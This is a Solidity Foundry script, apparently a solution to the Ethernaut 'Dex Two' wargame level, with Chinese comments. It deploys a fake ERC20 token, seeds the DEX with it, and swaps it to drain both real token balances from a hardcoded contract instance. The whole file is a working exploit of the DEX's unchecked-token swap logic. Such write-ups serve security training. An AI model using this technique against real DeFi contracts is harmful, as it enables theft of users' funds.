// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import {DexTwoExploitToken} from "../src/DexTwoExploitToken.sol";

interface IDexTwo {
    function swap(address from, address to, uint256 amount) external;
    function token1() external view returns (address);
    function token2() external view returns (address);
    function balanceOf(address token, address account) external view returns (uint256);
}

contract DexTwoAttackScript is Script {
    function run() external {
        // 填你的 Dex Two 实例地址，不是关卡地址
        address dexTwoLevel = 0x063e98570c6cabc06208Ccefac6798d83fF38c62;
        IDexTwo dex = IDexTwo(dexTwoLevel);

        vm.startBroadcast();

        address token1 = dex.token1();
        address token2 = dex.token2();

        // 1) 部署假 ERC20，并给自己 1000 个假币
        DexTwoExploitToken fakeToken = new DexTwoExploitToken(1000 ether);

        // 2) 先给 Dex Two 转 1 个假币，让价格公式的分母不是 0
        fakeToken.transfer(dexTwoLevel, 1 ether);

        // 3) 授权 Dex Two 花费自己的假币
        fakeToken.approve(dexTwoLevel, type(uint256).max);

        // 此时 Dex 中 fakeToken 余额 = 1 ether
        // 用 1 个假币换光 token1:
        // swapAmount = 1e18 * 100 / 1e18 = 100
        dex.swap(address(fakeToken), token1, 1 ether);

        // 第一次 swap 后，Dex 中 fakeToken 余额 = 2 ether
        // 再用 2 个假币换光 token2:
        // swapAmount = 2e18 * 100 / 2e18 = 100
        dex.swap(address(fakeToken), token2, 2 ether);

        vm.stopBroadcast();

        console.log("fake token:", address(fakeToken));
        console.log("dex token1 balance:", dex.balanceOf(token1, dexTwoLevel));
        console.log("dex token2 balance:", dex.balanceOf(token2, dexTwoLevel));
    }
}
